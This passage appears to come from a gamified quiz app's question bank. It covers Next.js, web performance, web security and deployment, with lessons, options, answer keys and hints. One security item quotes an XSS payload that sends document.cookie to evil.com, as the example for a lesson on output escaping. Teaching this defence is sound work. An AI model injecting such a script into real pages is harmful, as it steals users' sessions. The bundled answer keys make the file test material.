                    "In App Router, use fetch options and route segment config\n"
                    "to control caching behavior."
                ),
                "options": [
                    "SSG runs on the client; SSR runs on the server",
                    "SSG generates HTML at build time; SSR generates HTML on each request",
                    "SSG is for JavaScript; SSR is for TypeScript",
                    "SSG uses React; SSR uses plain HTML",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "The difference is about WHEN the HTML is generated.",
                    "Build time (once, ahead of time) vs request time (per-visitor).",
                ],
            },
            {
                "id": "next_4",
                "type": "quiz",
                "title": "API Routes",
                "question": (
                    "In the App Router, how do you create an API endpoint\n"
                    "that handles GET and POST requests at /api/users?"
                ),
                "lesson": (
                    "App Router API routes use route.ts files with named exports:\n\n"
                    "  // app/api/users/route.ts\n"
                    "  export async function GET(request: Request) {\n"
                    "    const users = await db.users.findAll();\n"
                    "    return Response.json(users);\n"
                    "  }\n\n"
                    "  export async function POST(request: Request) {\n"
                    "    const body = await request.json();\n"
                    "    const user = await db.users.create(body);\n"
                    "    return Response.json(user, { status: 201 });\n"
                    "  }\n\n"
                    "Supported HTTP methods: GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS.\n"
                    "route.ts and page.tsx cannot coexist in the same folder."
                ),
                "options": [
                    "Create pages/api/users.js with a default export function",
                    "Create app/api/users/route.ts with named exports (GET, POST)",
                    "Create app/api/users/page.tsx with API handler functions",
                    "Create app/api/users/handler.ts with module.exports",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "App Router uses route.ts (not page.tsx) for API endpoints.",
                    "Each HTTP method is a named export: export async function GET/POST/etc.",
                ],
            },
            {
                "id": "next_5",
                "type": "quiz",
                "title": "Middleware",
                "question": (
                    "Where do you place the middleware.ts file in a Next.js\n"
                    "project, and what does it allow you to do?"
                ),
                "lesson": (
                    "Next.js middleware runs BEFORE a request is completed:\n\n"
                    "  // middleware.ts (at the project root, next to app/)\n"
                    "  import { NextResponse } from 'next/server';\n\n"
                    "  export function middleware(request) {\n"
                    "    if (!request.cookies.get('session')) {\n"
                    "      return NextResponse.redirect(new URL('/login', request.url));\n"
                    "    }\n"
                    "    return NextResponse.next();\n"
                    "  }\n\n"
                    "  export const config = {\n"
                    "    matcher: ['/dashboard/:path*'],\n"
                    "  };\n\n"
                    "Use cases: auth checks, redirects, A/B testing, geolocation,\n"
                    "header modification. Runs at the Edge (fast, limited APIs)."
                ),
                "options": [
                    "Inside app/middleware/ — it creates route-specific middleware",
                    "At the project root (next to app/) — it runs before matching routes",
                    "Inside each route folder — it runs per-route",
                    "In next.config.js — it's configured as a plugin",
                ],
                "answer": "b",
                "xp": 35,
                "hints": [
                    "middleware.ts is a single file that applies to the entire application.",
                    "It lives at the project root level — the same level as the app/ directory.",
                ],
            },
            {
                "id": "next_6",
                "type": "quiz",
                "title": "next/image Optimization",
                "question": (
                    "Why should you use the <Image> component from next/image\n"
                    "instead of a plain <img> tag?"
                ),
                "lesson": (
                    "next/image provides automatic image optimization:\n\n"
                    "  import Image from 'next/image';\n\n"
                    "  <Image\n"
                    "    src='/hero.jpg'\n"
                    "    width={800}\n"
                    "    height={400}\n"
                    "    alt='Hero banner'\n"
                    "  />\n\n"
                    "Benefits over <img>:\n"
                    "  - Automatic format conversion (WebP, AVIF)\n"
                    "  - Responsive srcset generation\n"
                    "  - Lazy loading by default\n"
                    "  - Prevents Cumulative Layout Shift (requires width/height)\n"
                    "  - On-demand resizing (no build-time processing)\n\n"
                    "For remote images, configure domains in next.config.js."
                ),
                "options": [
                    "It adds a border and shadow by default for better aesthetics",
                    "It automatically optimizes format, size, and loading behavior",
                    "It converts all images to SVG for scalability",
                    "It stores images in localStorage for offline access",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "The Image component solves common performance problems with images on the web.",
                    "Think: format conversion, responsive sizing, lazy loading, layout shift prevention.",
                ],
            },
        ],
    },

    # ── ZONE 6: WEB PERFORMANCE ───────────────────────────────────────
    "web_performance": {
        "id": "web_performance",
        "name": "The Speed Protocol",
        "subtitle": "Core Web Vitals, Lazy Loading, Code Splitting & Caching",
        "color": "green",
        "icon": "🚀",
        "commands": ["LCP", "CLS", "INP", "lazy()", "Cache-Control"],
        "challenges": [
            {
                "id": "perf_1",
                "type": "quiz",
                "title": "Core Web Vitals",
                "question": (
                    "Google's Core Web Vitals measure three aspects of user\n"
                    "experience. Which set of metrics are the current Core Web Vitals?"
                ),
                "lesson": (
                    "Core Web Vitals (as of 2024):\n\n"
                    "  LCP (Largest Contentful Paint):\n"
                    "  - Measures loading performance\n"
                    "  - Time until the largest visible element renders\n"
                    "  - Target: under 2.5 seconds\n\n"
                    "  INP (Interaction to Next Paint):\n"
                    "  - Measures interactivity / responsiveness\n"
                    "  - Replaced FID in March 2024\n"
                    "  - Time from user input to visual update\n"
                    "  - Target: under 200ms\n\n"
                    "  CLS (Cumulative Layout Shift):\n"
                    "  - Measures visual stability\n"
                    "  - Unexpected layout shifts during page load\n"
                    "  - Target: under 0.1\n\n"
                    "These metrics affect SEO ranking and user experience."
                ),
                "options": [
                    "FPS, TTI, DOMContentLoaded",
                    "LCP, INP, CLS",
                    "TTFB, FCP, TBT",
                    "Speed Index, First Paint, Load Time",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "There are exactly three Core Web Vitals, each measuring a different UX dimension.",
                    "Loading (LCP), Interactivity (INP, replaced FID), Visual Stability (CLS).",
                ],
            },
            {
                "id": "perf_2",
                "type": "quiz",
                "title": "Lazy Loading Images",
                "question": (
                    "You have a long page with 50 images. Most are below the fold.\n"
                    "What native HTML attribute defers loading off-screen images?"
                ),
                "lesson": (
                    "Native lazy loading with the loading attribute:\n\n"
                    "  <img src='photo.jpg' loading='lazy' alt='Photo'>\n\n"
                    "Values:\n"
                    "  loading='lazy'  — defer loading until near the viewport\n"
                    "  loading='eager' — load immediately (default behavior)\n\n"
                    "Best practices:\n"
                    "  - Use loading='lazy' for below-the-fold images\n"
                    "  - Do NOT lazy-load the LCP image (above the fold)\n"
                    "  - Always provide width and height to prevent layout shift\n"
                    "  - Works on <img> and <iframe> elements\n\n"
                    "No JavaScript required — it's built into the browser."
                ),
                "options": [
                    "defer='true'",
                    "loading='lazy'",
                    "async='image'",
                    "display='on-demand'",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "It's a native HTML attribute — no JavaScript library needed.",
                    "The attribute is 'loading' and the value describes the behavior: lazy.",
                ],
            },
            {
                "id": "perf_3",
                "type": "quiz",
                "title": "Code Splitting",
                "question": (
                    "In a React application, you want to split a heavy chart\n"
                    "component into its own bundle that loads only when needed.\n"
                    "Which function enables this?"
                ),
                "lesson": (
                    "Code splitting with React.lazy and dynamic imports:\n\n"
                    "  const Chart = React.lazy(() => import('./Chart'));\n\n"
                    "  function Dashboard() {\n"
                    "    return (\n"
                    "      <Suspense fallback={<Spinner />}>\n"
                    "        <Chart />\n"
                    "      </Suspense>\n"
                    "    );\n"
                    "  }\n\n"
                    "React.lazy:\n"
                    "  - Takes a function that returns a dynamic import()\n"
                    "  - The component is loaded only when it's first rendered\n"
                    "  - Must be wrapped in <Suspense> for the loading state\n\n"
                    "In Next.js, use next/dynamic for server-compatible code splitting."
                ),
                "options": [
                    "React.defer(() => import('./Chart'))",
                    "React.lazy(() => import('./Chart'))",
                    "React.split(() => require('./Chart'))",
                    "React.async(() => fetch('./Chart'))",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "React has a built-in function for lazy-loading components.",
                    "React.lazy() takes a function that returns a dynamic import().",
                ],
            },
            {
                "id": "perf_4",
                "type": "quiz",
                "title": "CDN Caching",
                "question": (
                    "You deploy your static assets (JS, CSS, images) to a CDN.\n"
                    "Which HTTP header tells the CDN and browser how long to\n"
                    "cache a file?"
                ),
                "lesson": (
                    "Cache-Control is the primary HTTP caching header:\n\n"
                    "  Cache-Control: public, max-age=31536000, immutable\n\n"
                    "Common directives:\n"
                    "  public       — CDN and browser can cache\n"
                    "  private      — only the browser can cache (not CDN)\n"
                    "  max-age=N    — cache for N seconds\n"
                    "  no-cache     — must revalidate before using cache\n"
                    "  no-store     — never cache (sensitive data)\n"
                    "  immutable    — file will never change (hashed filenames)\n\n"
                    "Strategy for static assets:\n"
                    "  - Use content-hashed filenames (app.a1b2c3.js)\n"
                    "  - Set max-age=31536000 (1 year) + immutable\n"
                    "  - When code changes, the filename hash changes = new URL"
                ),
                "options": [
                    "X-Cache-Duration",
                    "Cache-Control",
                    "Expires-After",
                    "CDN-TTL",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "It's a standard HTTP response header, not vendor-specific.",
                    "The header name literally describes what it controls: caching.",
                ],
            },
            {
                "id": "perf_5",
                "type": "quiz",
                "title": "Lighthouse Categories",
                "question": (
                    "Google Lighthouse audits web pages across several categories.\n"
                    "Which of the following is NOT a standard Lighthouse audit category?"
                ),
                "lesson": (
                    "Lighthouse audit categories:\n\n"
                    "  Performance    — loading speed, interactivity, visual stability\n"
                    "  Accessibility  — screen readers, color contrast, ARIA\n"
                    "  Best Practices — HTTPS, no deprecated APIs, image aspect ratios\n"
                    "  SEO            — meta tags, crawlability, mobile-friendly\n"
                    "  PWA            — Progressive Web App criteria (optional)\n\n"
                    "Each category scores 0-100. Lighthouse can be run:\n"
                    "  - In Chrome DevTools (Lighthouse tab)\n"
                    "  - Via CLI: npx lighthouse https://example.com\n"
                    "  - Via PageSpeed Insights (web.dev/measure)\n\n"
                    "There is no 'Security' category — security checks fall under\n"
                    "Best Practices."
                ),
                "options": [
                    "Performance",
                    "Accessibility",
                    "Security",
                    "SEO",
                ],
                "answer": "c",
                "xp": 25,
                "hints": [
                    "Lighthouse has five categories: Performance, Accessibility, Best Practices, SEO, and PWA.",
                    "One of the options is not in that list. Security checks are part of Best Practices.",
                ],
            },
            {
                "id": "perf_6",
                "type": "quiz",
                "title": "Preventing Layout Shift",
                "question": (
                    "Images without explicit dimensions cause layout shift when\n"
                    "they load. What is the best way to reserve space for an image\n"
                    "before it loads?"
                ),
                "lesson": (
                    "Cumulative Layout Shift (CLS) occurs when elements change size\n"
                    "or position after the initial render:\n\n"
                    "  Common causes:\n"
                    "  - Images without width/height attributes\n"
                    "  - Ads or embeds that resize\n"
                    "  - Web fonts causing text reflow\n"
                    "  - Dynamic content injected above existing content\n\n"
                    "  Fix for images:\n"
                    "  <img src='photo.jpg' width='800' height='600' alt='Photo'>\n\n"
                    "  The browser calculates the aspect ratio from width/height\n"
                    "  and reserves the correct space before the image loads.\n\n"
                    "  CSS aspect-ratio also works:\n"
                    "  img { aspect-ratio: 4/3; width: 100%; }"
                ),
                "options": [
                    "Set display: block on all images",
                    "Set explicit width and height attributes on the <img> tag",
                    "Use JavaScript to measure and set dimensions on load",
                    "Wrap every image in a fixed-size container with overflow: hidden",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "The browser needs to know the image dimensions before download completes.",
                    "HTML width and height attributes let the browser calculate aspect ratio instantly.",
                ],
            },
        ],
    },

    # ── ZONE 7: WEB SECURITY ─────────────────────────────────────────
    "web_security": {
        "id": "web_security",
        "name": "The Firewall",
        "subtitle": "XSS, CSRF, CSP, HTTPS, CORS & Auth Best Practices",
        "color": "red",
        "icon": "🛡",
        "commands": ["CSP", "CORS", "CSRF token", "HttpOnly", "SameSite"],
        "challenges": [
            {
                "id": "sec_1",
                "type": "quiz",
                "title": "XSS Prevention",
                "question": (
                    "A user submits a comment containing:\n"
                    "  <script>document.location='https://evil.com?c='+document.cookie</script>\n\n"
                    "What is the primary defense against this type of attack?"
                ),
                "lesson": (
                    "Cross-Site Scripting (XSS) injects malicious scripts into web pages:\n\n"
                    "  Types:\n"
                    "  - Stored XSS: script saved in database, served to other users\n"
                    "  - Reflected XSS: script in URL parameters, reflected in response\n"
                    "  - DOM XSS: script manipulates client-side DOM directly\n\n"
                    "  Primary defense: Output encoding / escaping\n"
                    "  - Convert < to &lt;, > to &gt;, etc.\n"
                    "  - React does this automatically for JSX expressions\n"
                    "  - NEVER use dangerouslySetInnerHTML with user input\n\n"
                    "  Additional layers:\n"
                    "  - Content Security Policy (CSP) headers\n"
                    "  - HttpOnly cookies (JavaScript can't read them)\n"
                    "  - Input validation and sanitization"
                ),
                "options": [
                    "Blocking all JavaScript in the browser",
                    "Output encoding — escaping HTML entities before rendering user input",
                    "Using POST instead of GET for all requests",
                    "Requiring CAPTCHA on every form submission",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "The attack works because user input is rendered as executable HTML.",
                    "The defense is to ensure user input is treated as text, not code — escape it.",
                ],
            },
            {
                "id": "sec_2",
                "type": "quiz",
                "title": "CSRF Tokens",
                "question": (
                    "CSRF (Cross-Site Request Forgery) tricks a user's browser\n"
                    "into making unwanted requests. What is the standard defense?"
                ),
                "lesson": (
                    "CSRF attacks exploit the browser's automatic cookie sending:\n\n"
                    "  Attack: evil.com has a form that POSTs to bank.com/transfer.\n"
                    "  The browser sends the user's bank.com cookies automatically.\n"
                    "  The bank processes the request as if the user initiated it.\n\n"
                    "  Defense: CSRF tokens\n"
                    "  - Server generates a unique token per session/form\n"
                    "  - Token is included in the form as a hidden field\n"
                    "  - Server validates the token on submission\n"
                    "  - The attacker's site can't read or guess the token\n\n"
                    "  Additional defenses:\n"
                    "  - SameSite cookie attribute (Lax or Strict)\n"
                    "  - Check Origin/Referer headers\n"
                    "  - Require re-authentication for sensitive actions"
                ),
                "options": [
                    "Encrypting all form data with SSL",
                    "Including a unique, server-generated CSRF token in each form",
                    "Using JSON instead of form-encoded POST bodies",
                    "Setting Access-Control-Allow-Origin to '*'",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "The defense ensures the request actually came from YOUR site's form.",
                    "A secret token embedded in the form proves the request originated from your page.",
                ],
            },
            {
                "id": "sec_3",
                "type": "quiz",
                "title": "Content Security Policy",
                "question": (
                    "You want to prevent inline scripts from executing on your page,\n"
                    "even if an attacker injects them. Which HTTP header achieves this?"
                ),
                "lesson": (
                    "Content Security Policy (CSP) controls which resources can load:\n\n"
                    "  Content-Security-Policy: default-src 'self';\n"
                    "    script-src 'self' https://cdn.example.com;\n"
                    "    style-src 'self' 'unsafe-inline';\n"
                    "    img-src *;\n\n"
                    "  Key directives:\n"
                    "  default-src — fallback for all resource types\n"
                    "  script-src  — allowed JavaScript sources\n"
                    "  style-src   — allowed CSS sources\n"
                    "  img-src     — allowed image sources\n"
                    "  connect-src — allowed fetch/XHR targets\n\n"
                    "  'self'           — same origin only\n"
                    "  'none'           — block everything\n"
                    "  'unsafe-inline'  — allow inline (weakens CSP)\n"
                    "  'nonce-abc123'   — allow specific inline scripts by nonce"
                ),
                "options": [
                    "X-Frame-Options",
                    "Content-Security-Policy",
                    "X-Content-Type-Options",
                    "Strict-Transport-Security",
                ],
                "answer": "b",
                "xp": 35,
                "hints": [
                    "This header defines a policy about what content is allowed to execute.",
                    "Content-Security-Policy (CSP) — the most powerful XSS mitigation header.",
                ],
            },
            {
                "id": "sec_4",
                "type": "quiz",
                "title": "CORS Explained",
                "question": (
                    "Your frontend at https://app.com makes a fetch() request to\n"
                    "https://api.com/data. The browser blocks it. What mechanism\n"
                    "is responsible, and how does the API server fix it?"
                ),
                "lesson": (
                    "CORS (Cross-Origin Resource Sharing) controls cross-domain requests:\n\n"
                    "  The browser blocks requests to different origins by default.\n"
                    "  Same origin = same protocol + domain + port.\n\n"
                    "  The API server must include CORS headers in its response:\n"
                    "  Access-Control-Allow-Origin: https://app.com\n"
                    "  Access-Control-Allow-Methods: GET, POST, PUT\n"
                    "  Access-Control-Allow-Headers: Content-Type, Authorization\n\n"
                    "  For non-simple requests, the browser sends a preflight\n"
                    "  OPTIONS request first. The server must respond to it.\n\n"
                    "  NEVER set Access-Control-Allow-Origin: * for APIs that\n"
                    "  use cookies or authentication."
                ),
                "options": [
                    "The browser's firewall blocks it; disable the firewall in settings",
                    "CORS blocks it; the API must set Access-Control-Allow-Origin header",
                    "SSL certificate mismatch; both sites need the same certificate",
                    "DNS block; add the API domain to the hosts file",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "Different origins (protocol + domain + port) trigger browser security.",
                    "CORS is a header-based system where the SERVER tells the browser what's allowed.",
                ],
            },
            {
                "id": "sec_5",
                "type": "quiz",
                "title": "Secure Cookie Attributes",
                "question": (
                    "You're storing a session token in a cookie. Which combination\n"
                    "of attributes provides the strongest security?"
                ),
                "lesson": (
                    "Cookie security attributes:\n\n"
                    "  HttpOnly   — JavaScript cannot read the cookie (prevents XSS theft)\n"
                    "  Secure     — Cookie only sent over HTTPS\n"
                    "  SameSite   — Controls cross-site cookie sending\n"
                    "    Strict   — never sent cross-site (strongest)\n"
                    "    Lax      — sent on top-level navigations (good default)\n"
                    "    None     — always sent (requires Secure flag)\n\n"
                    "  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax\n\n"
                    "  Best practice for session cookies:\n"
                    "  HttpOnly + Secure + SameSite=Lax (or Strict)\n\n"
                    "  Never store sensitive data in cookies accessible to JavaScript."
                ),
                "options": [
                    "Secure; SameSite=None",
                    "HttpOnly; Secure; SameSite=Lax",
                    "HttpOnly only (no other attributes needed)",
                    "Encrypted=true; Visible=false",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "You need multiple attributes working together for defense in depth.",
                    "HttpOnly prevents JS access, Secure requires HTTPS, SameSite prevents CSRF.",
                ],
            },
            {
                "id": "sec_6",
                "type": "quiz",
                "title": "Auth Best Practices",
                "question": (
                    "When implementing authentication for a web application,\n"
                    "where should you store JWTs (JSON Web Tokens) for the\n"
                    "most secure approach?"
                ),
                "lesson": (
                    "JWT storage options and their tradeoffs:\n\n"
                    "  localStorage:\n"
                    "  - Accessible to JavaScript → vulnerable to XSS\n"
                    "  - Persists across tabs and sessions\n"
                    "  - NOT recommended for auth tokens\n\n"
                    "  HttpOnly cookie:\n"
                    "  - NOT accessible to JavaScript (XSS-safe)\n"
                    "  - Automatically sent with requests\n"
                    "  - Needs CSRF protection (SameSite + CSRF token)\n"
                    "  - RECOMMENDED for auth tokens\n\n"
                    "  sessionStorage:\n"
                    "  - Cleared when tab closes\n"
                    "  - Still accessible to JavaScript (XSS risk)\n\n"
                    "  In-memory (variable):\n"
                    "  - Safest from XSS, but lost on refresh\n"
                    "  - Used with silent refresh flows"
                ),
                "options": [
                    "localStorage for persistence across sessions",
                    "An HttpOnly, Secure cookie with SameSite attribute",
                    "sessionStorage because it clears on tab close",
                    "A global JavaScript variable for fastest access",
                ],
                "answer": "b",
                "xp": 35,
                "hints": [
                    "The biggest threat to tokens is XSS — JavaScript stealing them.",
                    "The only storage that JavaScript can't access is an HttpOnly cookie.",
                ],
            },
        ],
    },

    # ── ZONE 8: DEPLOYMENT ────────────────────────────────────────────
    "deployment": {
        "id": "deployment",
        "name": "The Launch Pad",
        "subtitle": "Vercel, Netlify, Docker, CI/CD & Preview Deployments",
        "color": "cyan",
        "icon": "🌐",
        "commands": ["vercel", "netlify deploy", "docker build", "github actions", "preview URL"],
        "challenges": [
            {
                "id": "dep_1",
                "type": "quiz",
                "title": "Vercel Deployment Model",
                "question": (
                    "What happens when you push a commit to a branch connected\n"
                    "to Vercel?"
                ),
                "lesson": (
                    "Vercel's deployment model:\n\n"
                    "  Every git push triggers a deployment:\n"
                    "  - Push to main → production deployment (live URL)\n"
                    "  - Push to any other branch → preview deployment (unique URL)\n\n"
                    "  Each deployment is:\n"
                    "  - Immutable (never modified after build)\n"
                    "  - Globally distributed on Vercel's Edge network\n"
                    "  - Independently accessible via its own URL\n\n"
                    "  Vercel auto-detects framework:\n"
                    "  Next.js, Vite, Remix, Astro, SvelteKit — zero config.\n\n"
                    "  Environment variables can differ per environment\n"
                    "  (Production, Preview, Development)."
                ),
                "options": [
                    "Nothing — you must manually trigger deployments from the dashboard",
                    "Vercel automatically builds and deploys, creating a preview or production URL",
                    "It queues a build that runs during the next scheduled deployment window",
                    "It sends a notification asking you to approve the deployment",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "Vercel's model is push-to-deploy — automatic, triggered by git events.",
                    "Every push gets its own deployment. Main branch = production, other branches = preview.",
                ],
            },
            {
                "id": "dep_2",
                "type": "quiz",
                "title": "Netlify vs Vercel",
                "question": (
                    "Both Vercel and Netlify support static site deployment.\n"
                    "What is Vercel's primary differentiator for Next.js applications?"
                ),
                "lesson": (
                    "Vercel and Netlify comparison:\n\n"
                    "  Both support:\n"
                    "  - Git-based deployments\n"
                    "  - CDN distribution\n"
                    "  - Preview deployments\n"
                    "  - Serverless functions\n"
                    "  - Custom domains + HTTPS\n\n"
                    "  Vercel's advantage for Next.js:\n"
                    "  - Built by the same team that builds Next.js\n"
                    "  - First-class support for all Next.js features\n"
                    "  - Server Components, Middleware, ISR, Image Optimization\n"
                    "  - Edge Runtime support\n\n"
                    "  Netlify's strengths:\n"
                    "  - Framework-agnostic focus\n"
                    "  - Netlify Forms, Identity, CMS built-in\n"
                    "  - Strong community and plugin ecosystem"
                ),
                "options": [
                    "Vercel supports custom domains; Netlify does not",
                    "Vercel is built by the Next.js team with first-class support for all Next.js features",
                    "Vercel is free; Netlify is paid-only",
                    "Vercel supports React; Netlify only supports Vue",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "Vercel and Next.js share the same parent company (Vercel Inc.).",
                    "This means every Next.js feature works perfectly on Vercel from day one.",
                ],
            },
            {
                "id": "dep_3",
                "type": "quiz",
                "title": "Docker for Frontend",
                "question": (
                    "You're containerizing a Next.js application with Docker.\n"
                    "What is the recommended multi-stage build approach?"
                ),
                "lesson": (
                    "Multi-stage Docker build for Next.js:\n\n"
                    "  # Stage 1: Install dependencies\n"
                    "  FROM node:20-alpine AS deps\n"
                    "  COPY package.json package-lock.json ./\n"
                    "  RUN npm ci\n\n"
                    "  # Stage 2: Build the application\n"
                    "  FROM node:20-alpine AS builder\n"
                    "  COPY --from=deps /app/node_modules ./node_modules\n"
                    "  COPY . .\n"
                    "  RUN npm run build\n\n"
                    "  # Stage 3: Production image\n"
                    "  FROM node:20-alpine AS runner\n"
                    "  COPY --from=builder /app/.next ./.next\n"
                    "  COPY --from=builder /app/public ./public\n"
                    "  CMD ['npm', 'start']\n\n"
                    "Benefits: smaller final image (no dev dependencies or source).\n"
                    "next.config.js: output: 'standalone' for even smaller images."
                ),
                "options": [
                    "Single stage: COPY everything, npm install, npm build, npm start in one layer",
                    "Multi-stage: separate stages for deps, build, and production runtime",
                    "No Docker needed — Next.js has built-in containerization",
                    "Use docker-compose only — Dockerfiles aren't needed for frontend apps",
                ],
                "answer": "b",
                "xp": 35,
                "hints": [
                    "The key technique is separating build-time concerns from runtime.",
                    "Multi-stage builds create a small production image without dev dependencies.",
                ],
            },
            {
                "id": "dep_4",
                "type": "quiz",
                "title": "CI/CD for Web Apps",
                "question": (
                    "In a GitHub Actions workflow for a web app, what is the\n"
                    "typical sequence of CI steps before deployment?"
                ),
                "lesson": (
                    "Standard CI/CD pipeline for web applications:\n\n"
                    "  name: CI\n"
                    "  on: [push, pull_request]\n"
                    "  jobs:\n"
                    "    build:\n"
                    "      steps:\n"
                    "        - uses: actions/checkout@v4\n"
                    "        - uses: actions/setup-node@v4\n"
                    "        - run: npm ci              # install deps\n"
                    "        - run: npm run lint         # code quality\n"
                    "        - run: npm run type-check   # TypeScript\n"
                    "        - run: npm test             # unit tests\n"
                    "        - run: npm run build        # verify build\n\n"
                    "  Order matters:\n"
                    "  1. Install (fast, deterministic with lockfile)\n"
                    "  2. Lint (catches style issues instantly)\n"
                    "  3. Type-check (catches type errors)\n"
                    "  4. Test (catches logic errors)\n"
                    "  5. Build (verifies production build succeeds)"
                ),
                "options": [
                    "Build first, then install dependencies, then run tests",
                    "Install dependencies, lint, type-check, test, then build",
                    "Deploy to staging, run tests against staging, then promote to production",
                    "Only run tests — linting and building are done locally",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "Dependencies must be installed first. Then quality checks. Then build.",
                    "Lint and type-check are fast and catch issues before slower test and build steps.",
                ],
            },
            {
                "id": "dep_5",
                "type": "quiz",
                "title": "Preview Deployments",
                "question": (
                    "A teammate opens a pull request. Within minutes, a bot\n"
                    "comments with a live URL showing the changes. What is this\n"
                    "deployment pattern called?"
                ),
                "lesson": (
                    "Preview deployments (also called deploy previews):\n\n"
                    "  Every pull request gets its own live deployment:\n"
                    "  - Unique URL (e.g., my-app-abc123.vercel.app)\n"
                    "  - Built from the PR's branch\n"
                    "  - Accessible to anyone with the link\n"
                    "  - Automatically updated on new commits to the PR\n\n"
                    "  Benefits:\n"
                    "  - Review visual changes without running locally\n"
                    "  - QA can test features before merge\n"
                    "  - Stakeholders can preview without dev tools\n"
                    "  - Automated tests can run against the preview URL\n\n"
                    "  Supported by: Vercel, Netlify, Cloudflare Pages,\n"
                    "  AWS Amplify, Railway, and others."
                ),
                "options": [
                    "Canary deployment",
                    "Preview deployment (deploy preview)",
                    "Blue-green deployment",
                    "Shadow deployment",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "It's a deployment specifically tied to a pull request for previewing changes.",
                    "The term is literally descriptive: you're previewing the deployment.",
                ],
            },
            {
                "id": "dep_6",
                "type": "quiz",
                "title": "Environment Variables in Production",
                "question": (
                    "Your Next.js app needs an API key available to server-side\n"
                    "code but NOT exposed to the browser. How should you name\n"
                    "the environment variable?"
                ),
                "lesson": (
                    "Next.js environment variable conventions:\n\n"
                    "  Server-only (never sent to the browser):\n"
                    "  DATABASE_URL=postgres://...\n"
                    "  API_SECRET=sk_live_...\n\n"
                    "  Browser-exposed (bundled into client JS):\n"
                    "  NEXT_PUBLIC_API_URL=https://api.example.com\n"
                    "  NEXT_PUBLIC_ANALYTICS_ID=UA-123456\n\n"
                    "  The NEXT_PUBLIC_ prefix is the boundary:\n"
                    "  - WITH prefix → available everywhere (server + client)\n"
                    "  - WITHOUT prefix → server-only (Route Handlers, Server Components)\n\n"
                    "  NEVER put secrets in NEXT_PUBLIC_ variables.\n"
                    "  They are literally inlined into the JavaScript bundle."
                ),
                "options": [
                    "NEXT_PUBLIC_API_KEY (so it's accessible everywhere)",
                    "Name it without the NEXT_PUBLIC_ prefix (e.g., API_KEY)",
                    "CLIENT_API_KEY (any prefix works as long as it's not 'SECRET')",
                    "PRIVATE_API_KEY (the PRIVATE_ prefix keeps it server-only)",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "Next.js uses a specific prefix to decide what gets sent to the browser.",
                    "Only variables starting with NEXT_PUBLIC_ are exposed to the client. Omit the prefix for server-only.",
                ],
            },
        ],
    },
}
